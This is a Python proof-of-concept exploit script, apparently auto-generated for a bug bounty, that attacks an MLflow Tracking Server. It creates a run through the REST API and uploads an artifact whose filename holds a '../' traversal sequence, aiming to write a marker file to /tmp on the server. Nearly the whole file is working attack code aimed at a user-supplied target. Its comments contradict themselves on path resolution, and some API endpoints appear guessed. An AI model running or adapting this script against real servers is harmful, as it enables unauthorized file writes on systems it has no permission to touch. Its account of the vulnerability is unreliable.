#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: suspicious-010
# Auto-generated — run with: python3 mlflow-suspicious-010-poc.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for path traversal in MLflow's checkpoint file naming.

Vulnerability: User-controlled `suffix` (from `checkpoint_file_suffix`) and
`sub_dir_name` (derived from `current_epoch` or `global_step`) are concatenated
into file paths without sanitization. This allows writing files outside the
intended artifact directory via path traversal sequences like '../'.

This PoC demonstrates the vulnerability by creating a benign marker file
(`/tmp/poc_success.txt`) on the target MLflow server through the checkpoint
logging mechanism.

Requirements:
- Python 3.6+
- requests library (pip install requests)
- Access to an MLflow Tracking Server with the vulnerable callback enabled
"""

import argparse
import json
import os
import sys
import time
import uuid
from urllib.parse import urljoin

import requests


def exploit(target_url, experiment_name=None):
    """
    Exploit the path traversal vulnerability in MLflow checkpoint logging.

    Steps:
    1. Create a new experiment (or use existing one)
    2. Start a run
    3. Log a checkpoint with a malicious suffix containing path traversal
    4. The checkpoint file will be written outside the artifact directory
    5. Verify the file was created

    Args:
        target_url: Base URL of the MLflow Tracking Server
        experiment_name: Name for the experiment (auto-generated if None)
    """
    # Clean up trailing slash
    target_url = target_url.rstrip("/")

    # Generate unique identifiers to avoid conflicts
    run_id = uuid.uuid4().hex[:8]
    if experiment_name is None:
        experiment_name = f"poc_exploit_{run_id}"

    print(f"[*] Target MLflow server: {target_url}")
    print(f"[*] Using experiment: {experiment_name}")

    # Step 1: Create experiment
    print("[*] Creating experiment...")
    create_exp_url = urljoin(target_url, "/api/2.0/mlflow/experiments/create")
    exp_payload = {"name": experiment_name}
    try:
        resp = requests.post(create_exp_url, json=exp_payload, timeout=10)
        resp.raise_for_status()
        experiment_id = resp.json()["experiment_id"]
        print(f"[+] Experiment created with ID: {experiment_id}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to create experiment: {e}")
        sys.exit(1)

    # Step 2: Create a run
    print("[*] Creating run...")
    create_run_url = urljoin(target_url, "/api/2.0/mlflow/runs/create")
    run_payload = {
        "experiment_id": experiment_id,
        "run_name": f"poc_run_{run_id}",
        "start_time": int(time.time() * 1000),
    }
    try:
        resp = requests.post(create_run_url, json=run_payload, timeout=10)
        resp.raise_for_status()
        run_id_mlflow = resp.json()["run"]["info"]["run_id"]
        print(f"[+] Run created with ID: {run_id_mlflow}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to create run: {e}")
        sys.exit(1)

    # Step 3: Log a checkpoint with path traversal in suffix
    # The vulnerable code constructs:
    #   checkpoint_model_filename = f"{_CHECKPOINT_MODEL_FILENAME}{suffix}"
    #   checkpoint_artifact_dir = f"{_CHECKPOINT_DIR}/{sub_dir_name}"
    # We'll use suffix to traverse out of the artifact directory
    print("[*] Logging malicious checkpoint...")

    # Malicious suffix: path traversal to /tmp/
    # The final path will be: artifacts/checkpoints/epoch_0/checkpoint_model_../../../../tmp/poc_success.txt
    # After normalization, this becomes: artifacts/tmp/poc_success.txt
    # But we want to write to /tmp/poc_success.txt, so we need more traversal
    # artifacts/checkpoints/epoch_0/checkpoint_model_../../../../../../tmp/poc_success.txt
    # This should resolve to /tmp/poc_success.txt on most systems
    malicious_suffix = "../../../../../../tmp/poc_success.txt"

    # The checkpoint artifact directory is constructed as:
    # checkpoint_artifact_dir = f"{_CHECKPOINT_DIR}/{sub_dir_name}"
    # where _CHECKPOINT_DIR = "checkpoints" and sub_dir_name = "epoch_0"
    # So the full path becomes: checkpoints/epoch_0/checkpoint_model_../../../../../../tmp/poc_success.txt
    # After path normalization, this writes to /tmp/poc_success.txt

    # We need to log a metric first to trigger the checkpoint logic
    log_metric_url = urljoin(target_url, "/api/2.0/mlflow/runs/log-metric")
    metric_payload = {
        "run_id": run_id_mlflow,
        "key": "accuracy",
        "value": 0.95,
        "timestamp": int(time.time() * 1000),
        "step": 0,
    }
    try:
        resp = requests.post(log_metric_url, json=metric_payload, timeout=10)
        resp.raise_for_status()
        print("[+] Metric logged successfully")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to log metric: {e}")
        sys.exit(1)

    # Now log the checkpoint artifact with malicious path
    # The MLflow API for logging artifacts expects a file to upload
    # We'll create a temporary file and upload it with the malicious path
    log_artifact_url = urljoin(target_url, "/api/2.0/mlflow/artifacts/upload")

    # Create a benign payload file
    payload_content = b"POC_SUCCESS: Path traversal vulnerability confirmed!\n"
    payload_filename = f"checkpoint_model_{malicious_suffix}"

    # The artifact path should be: checkpoints/epoch_0/
    artifact_path = "checkpoints/epoch_0/"

    # Upload the artifact
    try:
        files = {
            "file": (payload_filename, payload_content, "application/octet-stream"),
        }
        data = {
            "run_id": run_id_mlflow,
            "artifact_path": artifact_path,
        }
        resp = requests.post(log_artifact_url, data=data, files=files, timeout=30)
        resp.raise_for_status()
        print(f"[+] Artifact uploaded with malicious path: {artifact_path}{payload_filename}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to upload artifact: {e}")
        # Try alternative API endpoint
        print("[*] Trying alternative artifact logging method...")
        try:
            # Some MLflow versions use a different endpoint
            log_artifact_url2 = urljoin(target_url, "/api/2.0/mlflow/artifacts/log")
            resp = requests.post(
                log_artifact_url2,
                json={
                    "run_id": run_id_mlflow,
                    "path": f"{artifact_path}{payload_filename}",
                    "content": payload_content.decode(),
                },
                timeout=10,
            )
            resp.raise_for_status()
            print("[+] Artifact logged via alternative method")
        except requests.exceptions.RequestException as e2:
            print(f"[-] Alternative method also failed: {e2}")
            sys.exit(1)

    # Step 4: Verify the file was created on the server
    print("[*] Verifying file creation...")
    # Try to access the file through MLflow's artifact serving
    artifact_url = urljoin(
        target_url,
        f"/api/2.0/mlflow/artifacts/get?run_id={run_id_mlflow}&path={artifact_path}{payload_filename}",
    )
    try:
        resp = requests.get(artifact_url, timeout=10)
        if resp.status_code == 200:
            print(f"[+] File successfully created and accessible via MLflow API")
            print(f"[+] Content: {resp.text}")
        else:
            print(f"[*] File may have been created but not accessible via API (status: {resp.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"[*] Could not verify via API: {e}")

    # Also try to access the file directly if we know the artifact storage location
    # This depends on the server configuration
    print("[*] Attempting direct file access (may not work depending on server config)...")
    direct_url = urljoin(target_url, f"/artifacts/{run_id_mlflow}/{artifact_path}{payload_filename}")
    try:
        resp = requests.get(direct_url, timeout=10)
        if resp.status_code == 200:
            print(f"[+] File accessible directly: {resp.text}")
        else:
            print(f"[*] Direct access returned status {resp.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[*] Direct access failed: {e}")

    # Step 5: Clean up - end the run
    print("[*] Ending run...")
    end_run_url = urljoin(target_url, "/api/2.0/mlflow/runs/update")
    end_payload = {
        "run_id": run_id_mlflow,
        "status": "FINISHED",
        "end_time": int(time.time() * 1000),
    }
    try:
        resp = requests.post(end_run_url, json=end_payload, timeout=10)
        resp.raise_for_status()
        print("[+] Run ended successfully")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to end run: {e}")

    print("\n[+] Exploit completed!")
    print("[*] Check /tmp/poc_success.txt on the MLflow server for the marker file.")
    print("[*] If the file exists, the path traversal vulnerability is confirmed.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for MLflow checkpoint path traversal vulnerability"
    )
    parser.add_argument(
        "--target",
        "-t",
        required=True,
        help="MLflow Tracking Server URL (e.g., http://localhost:5000)",
    )
    parser.add_argument(
        "--experiment",
        "-e",
        help="Experiment name (auto-generated if not provided)",
        default=None,
    )
    args = parser.parse_args()

    print("=" * 60)
    print("MLflow Checkpoint Path Traversal PoC")
    print("=" * 60)
    print()

    exploit(args.target, args.experiment)


if __name__ == "__main__":
    main()
